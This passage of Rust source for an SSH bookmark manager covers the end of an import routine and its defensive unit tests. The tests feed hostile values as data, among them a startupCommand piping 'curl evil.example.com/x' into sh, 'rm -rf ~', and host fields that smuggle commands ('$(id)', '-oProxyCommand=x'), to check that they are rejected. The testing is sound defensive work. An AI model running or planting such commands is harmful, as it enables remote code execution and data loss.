                    (true, old.id)
                }
                (Some(_), _, ImportStrategy::Duplicate) => {
                    let taken = |n: &str| name_pos.contains_key(n);
                    match unique_name(&cand.name, taken) {
                        Some(name) => {
                            cand.name = name;
                            cand.id = new_id();
                            let id = cand.id.clone();
                            name_pos.insert(cand.name.to_lowercase(), work.len());
                            work.push(cand);
                            (false, id)
                        }
                        None => {
                            invalid.push(ImportInvalid {
                                entry: ImportEntryKind::Bookmark,
                                index,
                                field: "name".to_owned(),
                                code: ImportInvalidCode::Invalid,
                            });
                            continue;
                        }
                    }
                }
                _ => {
                    cand.id = new_id();
                    let id = cand.id.clone();
                    name_pos.insert(lower, work.len());
                    work.push(cand);
                    (false, id)
                }
            };
            id_map.insert(ref_id, id.clone());
            entries.push(Entry {
                index,
                id,
                replace,
                jump_ref,
                stripped,
                command_from_file,
            });
        }

        // Resolve jumps between imported bookmarks (every id is known now) in one pass, then
        // validate the final state. A rejection can invalidate others (jump targets, cycles,
        // chain depth): dependents of a removed entry are rejected in the same step (reverse
        // graph), and the rest is re-validated with a fresh index, so a hostile file costs a
        // few O(n) passes instead of O(n) passes of O(n²).
        let mut rejected: HashSet<String> = HashSet::new();
        let mut pending: Vec<(usize, String, ImportInvalidCode)> = Vec::new();
        {
            let pos_of: HashMap<String, usize> = work
                .iter()
                .enumerate()
                .map(|(i, b)| (b.id.clone(), i))
                .collect();
            for (i, e) in entries.iter().enumerate() {
                let Some(r) = &e.jump_ref else { continue };
                let target = id_map
                    .get(r)
                    .filter(|t| pos_of.contains_key(t.as_str()))
                    .cloned();
                match (target, pos_of.get(&e.id).and_then(|p| work.get_mut(*p))) {
                    (Some(t), Some(slot)) => slot.proxy_jump = Some(JumpRef::Bookmark { id: t }),
                    _ => pending.push((
                        i,
                        "proxyJump".to_owned(),
                        ImportInvalidCode::UnresolvedReference,
                    )),
                }
            }
        }
        loop {
            apply_rejections(
                &mut work,
                &originals,
                &entries,
                &mut invalid,
                &mut rejected,
                std::mem::take(&mut pending),
            );
            let idx = BookmarkIndex::new(&work, &groups);
            let entry_of: HashMap<&str, usize> = entries
                .iter()
                .enumerate()
                .filter(|(_, e)| !rejected.contains(&e.id))
                .map(|(i, e)| (e.id.as_str(), i))
                .collect();
            for (&id, &i) in &entry_of {
                let Some(b) = idx.get(id) else { continue };
                if let Err(err) = validate_bookmark_in(b, &idx) {
                    let field = match err.kind {
                        ErrorCode::InvalidArgument { field } => field,
                        ErrorCode::InvalidHostname { .. } => "host".to_owned(),
                        _ => "bookmark".to_owned(),
                    };
                    pending.push((i, field, ImportInvalidCode::Invalid));
                }
            }
            // A bookmark that is not (or no longer) part of this import may now jump through a
            // replaced one into a chain that loops or is too deep: reject the first replaced
            // entry on its chain (its original comes back).
            for bad in idx.bad_chains() {
                if entry_of.contains_key(bad) {
                    continue;
                }
                let mut cur = bad;
                for _ in 0..=MAX_BOOKMARK_JUMPS {
                    let Some(JumpRef::Bookmark { id }) =
                        idx.get(cur).and_then(|b| b.proxy_jump.as_ref())
                    else {
                        break;
                    };
                    if let Some(&i) = entry_of.get(id.as_str())
                        && entries.get(i).is_some_and(|e| e.replace)
                    {
                        pending.push((i, "proxyJump".to_owned(), ImportInvalidCode::Invalid));
                        break;
                    }
                    cur = id;
                }
            }
            if pending.is_empty() {
                break;
            }
            pending.sort_by_key(|(i, _, _)| *i);
            pending.dedup_by_key(|(i, _, _)| *i);
        }

        // Saved passwords of replaced bookmarks follow the `bookmark_save` rules.
        let mut forget_password = Vec::new();
        let mut replaced_ids = Vec::new();
        // Replaced bookmarks whose own startup command was dropped because the file points them
        // at another server or account (the command must not be typed into a shell it was
        // never meant for). A command taken from the file (opt-in) belongs to its target.
        let mut local_command_dropped: HashSet<String> = HashSet::new();
        let (mut added, mut replaced) = (0u32, 0u32);
        for e in entries.iter().filter(|e| !rejected.contains(&e.id)) {
            if e.replace {
                replaced += 1;
                replaced_ids.push(e.id.clone());
                if let Some(old) = originals.get(&e.id)
                    && let Some(slot) = work.iter_mut().find(|b| b.id == e.id)
                {
                    if !e.command_from_file
                        && connection_target_changed(old, slot)
                        && slot.startup_command.is_some()
                    {
                        slot.startup_command = None;
                        local_command_dropped.insert(e.id.clone());
                    }
                    if carry_password(old, slot) {
                        forget_password.push(e.id.clone());
                    }
                }
            } else {
                added += 1;
            }
        }
        let startup_commands_stripped: Vec<String> = entries
            .iter()
            .filter(|e| {
                (e.stripped || local_command_dropped.contains(&e.id)) && !rejected.contains(&e.id)
            })
            .filter_map(|e| work.iter().find(|b| b.id == e.id).map(|b| b.name.clone()))
            .collect();
        let changed = added + replaced > 0 || groups.len() != self.groups.len();
        if changed {
            self.commit(groups, work)?;
        }
        Ok(ImportOutcome {
            added,
            replaced,
            skipped,
            invalid,
            forget_password,
            replaced_ids,
            changed,
            startup_commands_stripped,
        })
    }
}

#[cfg(test)]
mod tests {
    #![allow(clippy::unwrap_used, clippy::expect_used, clippy::indexing_slicing)]

    use super::*;
    use crate::ipc::dto::{AuthInput, BookmarkInput, GroupInput};
    use serde_json::json;

    fn doc(groups: Value, bookmarks: Value) -> Vec<u8> {
        serde_json::to_vec(&json!({
            "format": "shellfin-bookmarks", "version": 1, "exportedAt": "x",
            "groups": groups, "bookmarks": bookmarks,
        }))
        .unwrap()
    }

    fn bm(id: &str, name: &str, host: &str) -> Value {
        json!({ "id": id, "name": name, "host": host })
    }

    fn reason(e: &AppError) -> ImportInvalidReason {
        match e.kind {
            ErrorCode::ImportInvalidFile { reason } => reason,
            ref other => panic!("unexpected {other:?}"),
        }
    }

    fn store() -> (tempfile::TempDir, BookmarkStore) {
        let dir = tempfile::tempdir().unwrap();
        let (s, w) = BookmarkStore::load(dir.path());
        assert!(w.is_empty());
        (dir, s)
    }

    fn input(name: &str, host: &str) -> BookmarkInput {
        BookmarkInput {
            id: None,
            name: name.into(),
            host: host.into(),
            port: None,
            user: None,
            auth: AuthInput::Auto,
            proxy_jump: None,
            group_id: None,
            tags: vec![],
            start_dir: None,
            use_ssh_config: false,
            color: None,
            upload_limit_kibps: None,
            download_limit_kibps: None,
            confirm_connect: None,
            startup_command: None,
            notes: None,
        }
    }

    /// Export carries the new fields; import drops `startupCommand` (reported by
    /// final name), keeps a replaced bookmark's own command, validates `notes`/`confirmConnect`.
    #[test]
    fn v3_fields_export_and_hostile_import() {
        let (_d, mut s) = store();
        let mut i = input("web", "web.example.com");
        i.confirm_connect = Some(true);
        i.startup_command = Some(SensitiveText::new("tmux attach"));
        i.notes = Some("prod\nbox".into());
        s.save(i, 1).unwrap();
        let (bytes, _) = export_json(&s.dto(), 0);
        let v: Value = serde_json::from_slice(&bytes).unwrap();
        let b = &v["bookmarks"][0];
        assert_eq!(b["confirmConnect"], true);
        assert_eq!(b["startupCommand"], "tmux attach");
        assert_eq!(b["notes"], "prod\nbox");
        let (_, _, skipped) = export_ssh_config(&s.dto(), 0);
        let fields: Vec<&str> = skipped.iter().map(|k| k.field.as_str()).collect();
        for f in ["confirmConnect", "startupCommand", "notes"] {
            assert!(fields.contains(&f), "{f}: {fields:?}");
        }

        // Re-import of the own export with `replace`: the command is not taken from the file,
        // the existing one stays, and the bookmark is reported.
        let o = import(&mut s, &bytes, ImportStrategy::Replace);
        assert_eq!(o.replaced, 1);
        assert_eq!(o.startup_commands_stripped, vec!["web".to_owned()]);
        let web = s
            .dto()
            .bookmarks
            .into_iter()
            .find(|b| b.name == "web")
            .unwrap();
        assert_eq!(web.startup_command.unwrap().expose(), "tmux attach");
        assert!(web.confirm_connect);

        // A hostile file: commands of every shape are dropped; duplicates report the new name.
        let file = doc(
            json!([]),
            json!([
                { "id": "a", "name": "web", "host": "evil.example.com",
                  "startupCommand": "curl evil.example.com/x | sh", "confirmConnect": false },
                { "id": "b", "name": "b", "host": "b.example.com", "startupCommand": "rm -rf ~\nexit" },
                { "id": "c", "name": "c", "host": "c.example.com", "startupCommand": ["x"] },
                { "id": "d", "name": "d", "host": "d.example.com", "startupCommand": "   " },
                { "id": "e", "name": "e", "host": "e.example.com", "startupCommand": null,
                  "notes": "fine" },
                { "id": "f", "name": "f", "host": "f.example.com", "startupCommand": "ls",
                  "notes": "bad\u{1b}[31m" },
                { "id": "g", "name": "g", "host": "g.example.com", "confirmConnect": "yes" },
                { "id": "h", "name": "h", "host": "h.example.com", "notes": 7 }
            ]),
        );
        let o = import(&mut s, &file, ImportStrategy::Duplicate);
        assert_eq!(o.added, 5, "{o:?}");
        assert_eq!(
            o.startup_commands_stripped,
            vec!["web (2)".to_owned(), "b".to_owned(), "c".to_owned()]
        );
        let invalid: Vec<(u32, &str, ImportInvalidCode)> = o
            .invalid
            .iter()
            .map(|x| (x.index, x.field.as_str(), x.code))
            .collect();
        assert_eq!(
            invalid,
            vec![
                (5, "notes", ImportInvalidCode::Invalid),
                (6, "confirmConnect", ImportInvalidCode::WrongType),
                (7, "notes", ImportInvalidCode::WrongType),
            ]
        );
        let dto = s.dto();
        assert!(
            dto.bookmarks
                .iter()
                .filter(|b| b.name != "web")
                .all(|b| b.startup_command.is_none()),
            "no command is ever imported"
        );
        let e = dto.bookmarks.iter().find(|b| b.name == "e").unwrap();
        assert_eq!(e.notes.as_deref(), Some("fine"));
    }

    /// A file that replaces a bookmark and points it at another server or account must not
    /// inherit the local startup command (it would be typed into that server's shell), even
    /// when the file itself carries no command; the bookmark is reported.
    #[test]
    fn replace_that_retargets_a_bookmark_drops_its_startup_command() {
        let (_d, mut s) = store();
        for (name, host) in [("web", "web.example.com"), ("db", "db.example.com")] {
            let mut i = input(name, host);
            i.startup_command = Some(SensitiveText::new("sudo -i"));
            s.save(i, 1).unwrap();
        }
        let file = doc(
            json!([]),
            json!([
                { "id": "a", "name": "web", "host": "evil.example.com" },
                { "id": "b", "name": "db", "host": "db.example.com", "notes": "same target" }
            ]),
        );
        let o = import(&mut s, &file, ImportStrategy::Replace);
        assert_eq!(o.replaced, 2, "{o:?}");
        assert_eq!(o.startup_commands_stripped, vec!["web".to_owned()]);
        let dto = s.dto();
        let by_name = |n: &str| dto.bookmarks.iter().find(|b| b.name == n).unwrap();
        assert_eq!(by_name("web").host, "evil.example.com");
        assert!(by_name("web").startup_command.is_none());
        assert_eq!(
            by_name("db").startup_command.as_ref().unwrap().expose(),
            "sudo -i"
        );
    }

    /// The default import: startup commands from the file are not kept.
    fn import(s: &mut BookmarkStore, bytes: &[u8], st: ImportStrategy) -> ImportOutcome {
        s.import(parse_import(bytes).unwrap(), st, false, 10)
            .unwrap()
    }

    /// The opt-in import: valid startup commands from the file are kept.
    fn import_keep(s: &mut BookmarkStore, bytes: &[u8], st: ImportStrategy) -> ImportOutcome {
        s.import(parse_import(bytes).unwrap(), st, true, 10)
            .unwrap()
    }

    fn command_of(s: &BookmarkStore, name: &str) -> Option<String> {
        s.dto()
            .bookmarks
            .into_iter()
            .find(|b| b.name == name)
            .unwrap()
            .startup_command
            .map(|c| c.expose().to_owned())
    }

    /// Every shape of command `bookmark_save` would refuse, by file index.
    fn hostile_command_entries() -> Vec<Value> {
        vec![
            json!({ "id": "a", "name": "array", "host": "a.example.com", "startupCommand": ["ls"] }),
            json!({ "id": "b", "name": "number", "host": "b.example.com", "startupCommand": 7 }),
            json!({ "id": "c", "name": "object", "host": "c.example.com",
                    "startupCommand": { "cmd": "ls" } }),
            json!({ "id": "d", "name": "bool", "host": "d.example.com", "startupCommand": true }),
            json!({ "id": "e", "name": "lf", "host": "e.example.com",
                    "startupCommand": "ls\nrm -rf ~" }),
            json!({ "id": "f", "name": "cr", "host": "f.example.com", "startupCommand": "ls\rx" }),
            json!({ "id": "g", "name": "tab", "host": "g.example.com", "startupCommand": "ls\tx" }),
            json!({ "id": "h", "name": "esc", "host": "h.example.com",
                    "startupCommand": "echo \u{1b}[31m" }),
            json!({ "id": "i", "name": "nul", "host": "i.example.com", "startupCommand": "a\u{0}b" }),
            json!({ "id": "j", "name": "del", "host": "j.example.com", "startupCommand": "a\u{7f}b" }),
            json!({ "id": "k", "name": "c1", "host": "k.example.com", "startupCommand": "a\u{85}b" }),
            json!({ "id": "l", "name": "ls", "host": "l.example.com",
                    "startupCommand": "a\u{2028}b" }),
            json!({ "id": "m", "name": "ps", "host": "m.example.com",
                    "startupCommand": "a\u{2029}b" }),
            json!({ "id": "n", "name": "long", "host": "n.example.com",
                    "startupCommand": "x".repeat(MAX_STARTUP_COMMAND_CHARS + 1) }),
        ]
    }

    /// Without the opt-in, a file with valid commands imports none of them (today's rule).
    #[test]
    fn keep_false_imports_no_command() {
        let (_d, mut s) = store();
        let file = doc(
            json!([]),
            json!([
                { "id": "a", "name": "a", "host": "a.example.com", "startupCommand": "uptime" },
                { "id": "b", "name": "b", "host": "b.example.com" }
            ]),
        );
        let o = import(&mut s, &file, ImportStrategy::Skip);
        assert_eq!(o.added, 2);
        assert_eq!(o.startup_commands_stripped, vec!["a".to_owned()]);
        assert!(
            s.dto()
                .bookmarks
                .iter()
                .all(|b| b.startup_command.is_none())
        );
    }

    /// With the opt-in, valid commands are stored verbatim (blank = none) and not reported.
    #[test]
    fn keep_true_imports_valid_commands() {
        let (dir, mut s) = store();
        let max = "é".repeat(MAX_STARTUP_COMMAND_CHARS);
        let file = doc(
            json!([]),
            json!([
                { "id": "a", "name": "a", "host": "a.example.com",
                  "startupCommand": " cd /srv && tmux attach " },
                { "id": "b", "name": "b", "host": "b.example.com", "startupCommand": "   " },
                { "id": "c", "name": "c", "host": "c.example.com", "startupCommand": null },
                { "id": "d", "name": "d", "host": "d.example.com", "startupCommand": max.clone() },
                { "id": "e", "name": "e", "host": "e.example.com" }
            ]),
        );
        let o = import_keep(&mut s, &file, ImportStrategy::Skip);
        assert_eq!(o.added, 5, "{o:?}");
        assert!(o.startup_commands_stripped.is_empty(), "{o:?}");
        assert_eq!(
            command_of(&s, "a").as_deref(),
            Some(" cd /srv && tmux attach ")
        );
        assert_eq!(command_of(&s, "b"), None);
        assert_eq!(command_of(&s, "c"), None);
        assert_eq!(command_of(&s, "d"), Some(max));
        assert_eq!(command_of(&s, "e"), None);
        // Stored like `bookmark_save` stores it: a reload keeps every bookmark and command.
        let (again, w) = BookmarkStore::load(dir.path());
        assert!(w.is_empty(), "{w:?}");
        assert_eq!(
            command_of(&again, "a").as_deref(),
            Some(" cd /srv && tmux attach ")
        );
    }

    /// With the opt-in, every command `bookmark_save` would refuse is dropped and reported;
    /// the bookmark itself is still imported.
    #[test]
    fn keep_true_drops_and_reports_invalid_commands() {
        let (_d, mut s) = store();
        let entries = hostile_command_entries();
        let names: Vec<String> = entries
            .iter()
            .map(|e| e["name"].as_str().unwrap().to_owned())
            .collect();
        let file = doc(json!([]), Value::Array(entries));
        let o = import_keep(&mut s, &file, ImportStrategy::Skip);
        assert_eq!(o.added as usize, names.len(), "{o:?}");
        assert!(o.invalid.is_empty(), "{o:?}");
        assert_eq!(o.startup_commands_stripped, names);
        assert!(
            s.dto()
                .bookmarks
                .iter()
                .all(|b| b.startup_command.is_none())
        );
    }

    /// `replace` with the opt-in: the file's valid command wins (also when the target changes);
    /// a file entry without a valid command keeps today's rule for the user's own command.
    #[test]
    fn keep_true_replace_rules() {
        let (_d, mut s) = store();
        for name in ["same", "moved", "none-same", "none-moved", "bad-same"] {
            let mut i = input(name, &format!("{name}.example.com"));
            i.startup_command = Some(SensitiveText::new("own"));
            s.save(i, 1).unwrap();
        }
        let file = doc(
            json!([]),
            json!([
                { "id": "a", "name": "same", "host": "same.example.com", "startupCommand": "file-a" },
                { "id": "b", "name": "moved", "host": "other.example.com", "startupCommand": "file-b" },
                { "id": "c", "name": "none-same", "host": "none-same.example.com" },
                { "id": "d", "name": "none-moved", "host": "other2.example.com" },
                { "id": "e", "name": "bad-same", "host": "bad-same.example.com",
                  "startupCommand": "a\nb" }
            ]),
        );
        let o = import_keep(&mut s, &file, ImportStrategy::Replace);
        assert_eq!(o.replaced, 5, "{o:?}");
        assert_eq!(command_of(&s, "same").as_deref(), Some("file-a"));
        assert_eq!(command_of(&s, "moved").as_deref(), Some("file-b"));
        assert_eq!(command_of(&s, "none-same").as_deref(), Some("own"));
        assert_eq!(command_of(&s, "none-moved"), None);
        assert_eq!(command_of(&s, "bad-same").as_deref(), Some("own"));
        assert_eq!(
            o.startup_commands_stripped,
            vec!["none-moved".to_owned(), "bad-same".to_owned()]
        );
    }

    /// `duplicate` with the opt-in: the renamed copy gets the file's command, the existing
    /// bookmark keeps its own; an invalid command is reported under the new name.
    #[test]
    fn keep_true_duplicate_carries_the_command_to_the_copy() {
        let (_d, mut s) = store();
        let mut i = input("web", "web.example.com");
        i.startup_command = Some(SensitiveText::new("own"));
        s.save(i, 1).unwrap();
        s.save(input("db", "db.example.com"), 1).unwrap();
        let file = doc(
            json!([]),
            json!([
                { "id": "a", "name": "web", "host": "web.example.com", "startupCommand": "file" },
                { "id": "b", "name": "DB", "host": "db.example.com", "startupCommand": ["x"] }
            ]),
        );
        let o = import_keep(&mut s, &file, ImportStrategy::Duplicate);
        assert_eq!(o.added, 2, "{o:?}");
        assert_eq!(command_of(&s, "web").as_deref(), Some("own"));
        assert_eq!(command_of(&s, "web (2)").as_deref(), Some("file"));
        assert_eq!(command_of(&s, "DB (2)"), None);
        assert_eq!(o.startup_commands_stripped, vec!["DB (2)".to_owned()]);
    }

    /// `skip` with the opt-in never touches the existing bookmark's command.
    #[test]
    fn keep_true_skip_leaves_the_existing_command() {
        let (_d, mut s) = store();
        let mut i = input("web", "web.example.com");
        i.startup_command = Some(SensitiveText::new("own"));
        s.save(i, 1).unwrap();
        let file = doc(
            json!([]),
            json!([{ "id": "a", "name": "WEB", "host": "x.example.com", "startupCommand": "file" }]),
        );
        let o = import_keep(&mut s, &file, ImportStrategy::Skip);
        assert_eq!((o.added, o.skipped, o.changed), (0, 1, false));
        assert_eq!(command_of(&s, "web").as_deref(), Some("own"));
    }

    /// The preview lists only valid commands of valid entries, counts name conflicts
    /// case-insensitively against the store, reports parse-stage rejections and writes nothing.
    #[test]
    fn preview_lists_valid_commands_conflicts_and_invalid_entries() {
        let (dir, mut s) = store();
        s.save(input("Web", "web.example.com"), 1).unwrap();
        s.save(input("db", "db.example.com"), 1).unwrap();
        let path = dir.path().join("bookmarks.json");
        let before = std::fs::read(&path).unwrap();
        let mut entries = vec![
            json!({ "id": "p1", "name": "WEB", "host": "w.example.com", "startupCommand": "tmux a" }),
            json!({ "id": "p2", "name": "new", "host": "n.example.com", "startupCommand": "  " }),
            json!({ "id": "p3", "name": "Db", "host": "d.example.com", "startupCommand": "htop" }),
            json!({ "id": "p4", "name": "bad host", "host": "bad host",
                    "startupCommand": "never listed" }),
            json!({ "id": "p5", "name": "other", "host": "o.example.com", "startupCommand": "uptime" }),
        ];
        entries.extend(hostile_command_entries());
        let p = parse_import(&doc(
            json!([{ "id": "g", "name": "" }]),
            Value::Array(entries),
        ))
        .unwrap();
        let preview = s.import_preview(&p);
        assert!(preview.picked);
        assert_eq!(
            preview.token, None,
            "the token is issued by the pending store"
        );
        assert_eq!(
            preview.bookmarks as usize,
            4 + hostile_command_entries().len()
        );
        assert_eq!(preview.conflicts, 2);
        // `exists` uses the same case-insensitive name test as `conflicts`.
        let listed: Vec<(&str, &str, bool)> = preview
            .startup_commands
            .iter()
            .map(|c| (c.name.as_str(), c.command.expose(), c.exists))
            .collect();
        assert_eq!(
            listed,
            vec![
                ("WEB", "tmux a", true),
                ("Db", "htop", true),
                ("other", "uptime", false)
            ]
        );
        let invalid: Vec<(ImportEntryKind, u32, &str)> = preview
            .invalid
            .iter()
            .map(|i| (i.entry, i.index, i.field.as_str()))
            .collect();
        assert_eq!(
            invalid,
            vec![
                (ImportEntryKind::Group, 0, "name"),
                (ImportEntryKind::Bookmark, 3, "host")
            ]
        );
        // The command never reaches a debug print of the preview.
        let dbg = format!("{preview:?}");
        assert!(
            !dbg.contains("tmux a") && !dbg.contains("uptime") && !dbg.contains("htop"),
            "{dbg}"
        );
        assert_eq!(std::fs::read(&path).unwrap(), before, "nothing was written");
        assert_eq!(s.dto().bookmarks.len(), 2);
    }

    #[test]
    fn rfc3339() {
        assert_eq!(rfc3339_utc(0), "1970-01-01T00:00:00Z");
        assert_eq!(rfc3339_utc(1_700_000_000_000), "2023-11-14T22:13:20Z");
        assert_eq!(rfc3339_utc(951_782_400_000), "2000-02-29T00:00:00Z");
        assert_eq!(rfc3339_utc(-1000), "1969-12-31T23:59:59Z");
    }

    #[test]
    fn file_level_refusals() {
        let ok = doc(json!([]), json!([]));
        assert!(parse_import(&ok).is_ok());
        assert_eq!(
            reason(&parse_import(b"{").unwrap_err()),
            ImportInvalidReason::NotJson
        );
        assert_eq!(
            reason(&parse_import(b"").unwrap_err()),
            ImportInvalidReason::NotJson
        );
        assert_eq!(
            reason(&parse_import(b"[]").unwrap_err()),
            ImportInvalidReason::BadStructure
        );
        assert_eq!(
            reason(&parse_import(b"\"x\"").unwrap_err()),
            ImportInvalidReason::BadStructure
        );
        for body in [
            json!({"format":"other","version":1}),
            json!({"version":1}),
            json!({"format":5,"version":1}),
        ] {
            let e = parse_import(&serde_json::to_vec(&body).unwrap()).unwrap_err();
            assert_eq!(reason(&e), ImportInvalidReason::UnknownFormat);
        }
        for v in [json!(2), json!(0), json!(1.5), json!(-1)] {
            let body = json!({"format":"shellfin-bookmarks","version":v});
            let e = parse_import(&serde_json::to_vec(&body).unwrap()).unwrap_err();
            assert_eq!(reason(&e), ImportInvalidReason::UnsupportedVersion, "{v}");
        }
        for v in [json!("1"), json!(null), json!([1])] {
            let body = json!({"format":"shellfin-bookmarks","version":v});
            let e = parse_import(&serde_json::to_vec(&body).unwrap()).unwrap_err();
            assert_eq!(reason(&e), ImportInvalidReason::BadStructure, "{v}");
        }
        let missing = json!({"format":"shellfin-bookmarks"});
        let e = parse_import(&serde_json::to_vec(&missing).unwrap()).unwrap_err();
        assert_eq!(reason(&e), ImportInvalidReason::BadStructure);
        // Collections of the wrong type.
        for body in [
            json!({"format":"shellfin-bookmarks","version":1,"bookmarks":{}}),
            json!({"format":"shellfin-bookmarks","version":1,"groups":"x"}),
        ] {
            let e = parse_import(&serde_json::to_vec(&body).unwrap()).unwrap_err();
            assert_eq!(reason(&e), ImportInvalidReason::BadStructure);
        }
    }

    #[test]
    fn oversized_and_too_many_and_deeply_nested() {
        let big =
            vec![b' '; usize::try_from(crate::platform::file_trust::IMPORT_MAX_BYTES).unwrap() + 1];
        assert_eq!(
            reason(&parse_import(&big).unwrap_err()),
            ImportInvalidReason::TooLarge
        );

        let many: Vec<Value> = (0..=MAX_IMPORT_BOOKMARKS)
            .map(|i| bm(&format!("b{i}"), &format!("n{i}"), "h.example.com"))
            .collect();
        assert_eq!(
            reason(&parse_import(&doc(json!([]), Value::Array(many))).unwrap_err()),
            ImportInvalidReason::TooMany
        );
        let groups: Vec<Value> = (0..=MAX_IMPORT_GROUPS)
            .map(|i| json!({"id": format!("g{i}"), "name": format!("g{i}")}))
            .collect();
        assert_eq!(
            reason(&parse_import(&doc(Value::Array(groups), json!([]))).unwrap_err()),
            ImportInvalidReason::TooMany
        );

        // Deep nesting: rejected by the parser's recursion limit, no stack overflow.
        let mut deep = String::from(r#"{"format":"shellfin-bookmarks","version":1,"bookmarks":"#);
        deep.push_str(&"[".repeat(100_000));
        deep.push_str(&"]".repeat(100_000));
        deep.push('}');
        assert_eq!(
            reason(&parse_import(deep.as_bytes()).unwrap_err()),
            ImportInvalidReason::NotJson
        );
        // Deep nesting inside an entry field is just a wrong type.
        let nested = doc(
            json!([]),
            json!([{"id":"a","name":"n","host":"h.example.com","tags":[[[[1]]]]}]),
        );
        let p = parse_import(&nested).unwrap();
        assert_eq!(p.valid_bookmarks(), 0);
        assert_eq!(p.invalid[0].field, "tags");
    }

    #[test]
    fn hostile_field_values_are_rejected_per_entry() {
        let long = "x".repeat(1_000_000);
        let cases: Vec<(Value, &str, ImportInvalidCode)> = vec![
            (
                json!({"id":"a","name":"n","host":"bad host"}),
                "host",
                ImportInvalidCode::Invalid,
            ),
            (
                json!({"id":"a","name":"n","host":"h;rm -rf /"}),
                "host",
                ImportInvalidCode::Invalid,
            ),
            (
                json!({"id":"a","name":"n","host":"h\nHost *"}),
                "host",
                ImportInvalidCode::Invalid,
            ),
            (
                json!({"id":"a","name":"n","host":"-oProxyCommand=x"}),
                "host",
                ImportInvalidCode::Invalid,
            ),
            (
                json!({"id":"a","name":"n","host":"$(id)"}),
                "host",
                ImportInvalidCode::Invalid,
            ),
            (
                json!({"id":"a","name":"n","host":"h","user":"a b"}),
                "user",
                ImportInvalidCode::Invalid,
            ),
            (
                json!({"id":"a","name":"n","host":"h","user":"a\nb"}),
                "user",
                ImportInvalidCode::Invalid,
            ),
            (
                json!({"id":"a","name":"n","host":"h","user":5}),
                "user",
                ImportInvalidCode::WrongType,
            ),
            (
                json!({"id":"a","name":"n","host":"h","port":0}),
                "port",
                ImportInvalidCode::Invalid,
            ),
            (
                json!({"id":"a","name":"n","host":"h","port":65536}),
                "port",
                ImportInvalidCode::Invalid,
            ),
            (
                json!({"id":"a","name":"n","host":"h","port":-1}),
                "port",
                ImportInvalidCode::Invalid,
            ),
            (
                json!({"id":"a","name":"n","host":"h","port":"22"}),
                "port",
                ImportInvalidCode::WrongType,
            ),
            (
                json!({"id":"a","name":"n","host":"h","port":1.5}),
                "port",
                ImportInvalidCode::Invalid,
            ),
            (
                json!({"id":"a","name":"","host":"h"}),
                "name",
                ImportInvalidCode::Invalid,
            ),
            (
                json!({"id":"a","name":"x\u{0}y","host":"h"}),
                "name",
                ImportInvalidCode::Invalid,
            ),
            (
                json!({"id":"a","name":long.clone(),"host":"h"}),
                "name",
                ImportInvalidCode::Invalid,
            ),
            (
                json!({"id":"a","name":"n","host":long.clone()}),
                "host",
                ImportInvalidCode::Invalid,
            ),
            (
                json!({"id":"a","name":"n","host":"h","user":long.clone()}),
                "user",
                ImportInvalidCode::Invalid,
            ),
            (
                json!({"id":"a","name":"n","host":"h","startDir":long.clone()}),
                "startDir",
                ImportInvalidCode::Invalid,
            ),
            (
                json!({"id":"a","name":"n","host":"h","startDir":"/a\u{0}b"}),
                "startDir",
                ImportInvalidCode::Invalid,
            ),
            (
                json!({"id":"a","name":"n","host":"h","auth":{"method":"key","identityFile":"a\u{0}b"}}),
                "auth.identityFile",
                ImportInvalidCode::Invalid,
            ),
            (
                json!({"id":"a","name":"n","host":"h","auth":{"method":"key"}}),
                "auth.identityFile",
                ImportInvalidCode::Missing,
            ),
            (
                json!({"id":"a","name":"n","host":"h","auth":{"method":"passkey"}}),
                "auth.method",
                ImportInvalidCode::Invalid,
            ),
            (
                json!({"id":"a","name":"n","host":"h","auth":"agent"}),
                "auth",
                ImportInvalidCode::WrongType,
            ),
            (
                json!({"id":"a","name":"n","host":"h","proxyJump":{"kind":"spec","spec":"x,,y"}}),
                "proxyJump",
                ImportInvalidCode::Invalid,
            ),
            (
                json!({"id":"a","name":"n","host":"h","proxyJump":{"kind":"spec","spec":"a b"}}),
                "proxyJump",
                ImportInvalidCode::Invalid,
            ),
            (
                json!({"id":"a","name":"n","host":"h","proxyJump":{"kind":"sshConfig","alias":"a*"}}),
                "proxyJump",
                ImportInvalidCode::Invalid,
            ),
            (
                json!({"id":"a","name":"n","host":"h","proxyJump":{"kind":"bookmark","id":"../x"}}),
                "proxyJump",
                ImportInvalidCode::Invalid,
            ),
            (
                json!({"id":"a","name":"n","host":"h","proxyJump":{"kind":"magic"}}),
                "proxyJump.kind",
                ImportInvalidCode::Invalid,
            ),
            (
                json!({"id":"a","name":"n","host":"h","proxyJump":[]}),
                "proxyJump",
                ImportInvalidCode::WrongType,
            ),
            (
                json!({"id":"a","name":"n","host":"h","tags":"x"}),
                "tags",
                ImportInvalidCode::WrongType,
            ),
            (
                json!({"id":"a","name":"n","host":"h","tags":[1]}),
                "tags",
                ImportInvalidCode::WrongType,
            ),
            (
                json!({"id":"a","name":"n","host":"h","tags":[""]}),
                "tags",
                ImportInvalidCode::Invalid,
            ),
            (
                json!({"id":"a","name":"n","host":"h","tags":vec!["t"; 21]}),
                "tags",
                ImportInvalidCode::Invalid,
            ),
            (
                json!({"id":"a","name":"n","host":"h","tags":["a\nb"]}),
                "tags",
                ImportInvalidCode::Invalid,
            ),
            (
                json!({"id":"a","name":"n","host":"h","uploadLimitKiBps":1_048_577}),
                "uploadLimitKiBps",
                ImportInvalidCode::Invalid,
            ),
            (
                json!({"id":"a","name":"n","host":"h","downloadLimitKiBps":-5}),
                "downloadLimitKiBps",
                ImportInvalidCode::Invalid,
            ),
            (
                json!({"id":"a","name":"n","host":"h","downloadLimitKiBps":"1"}),
                "downloadLimitKiBps",
                ImportInvalidCode::WrongType,
            ),
            (
                json!({"id":"a","name":"n","host":"h","useSshConfig":"yes"}),
                "useSshConfig",
                ImportInvalidCode::WrongType,
            ),
            (
                json!({"id":"a","name":"n","host":"h","groupId":"nope"}),
                "groupId",
                ImportInvalidCode::UnresolvedReference,
            ),
            (
                json!({"id":"a","name":"n","host":"h","groupId":7}),
                "groupId",
                ImportInvalidCode::WrongType,
            ),
            (
                json!({"id":"a b","name":"n","host":"h"}),
                "id",
                ImportInvalidCode::Invalid,
            ),
            (
                json!({"id":"../../etc","name":"n","host":"h"}),
                "id",
                ImportInvalidCode::Invalid,
            ),
            (
                json!({"id":"a".repeat(65),"name":"n","host":"h"}),
                "id",
                ImportInvalidCode::Invalid,
            ),
            (
                json!({"id":5,"name":"n","host":"h"}),
                "id",
                ImportInvalidCode::WrongType,
            ),
            (
                json!({"name":"n","host":"h"}),
                "id",
                ImportInvalidCode::Missing,
            ),
            (
                json!({"id":"a","host":"h"}),
                "name",
                ImportInvalidCode::Missing,
            ),
            (
